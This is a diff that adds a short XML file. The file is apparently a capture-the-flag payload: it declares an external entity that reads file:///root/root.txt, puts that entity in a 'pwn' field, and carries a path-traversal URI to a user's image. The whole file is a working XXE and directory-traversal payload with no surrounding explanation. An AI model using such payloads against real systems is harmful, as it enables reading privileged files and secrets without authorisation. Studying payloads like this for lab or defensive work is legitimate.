@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE lfi [ <!ENTITY key SYSTEM "file:///root/root.txt" > ]>
+<credits>
+  <author>woodenk</author>
+  <image>
+    <pwn>&key;</pwn>
+    <uri>/../../../../../../../home/woodenk/greg.jpg</uri>
+    <views>0</views>
+  </image>
+  <totalviews>0</totalviews>
+</credits>
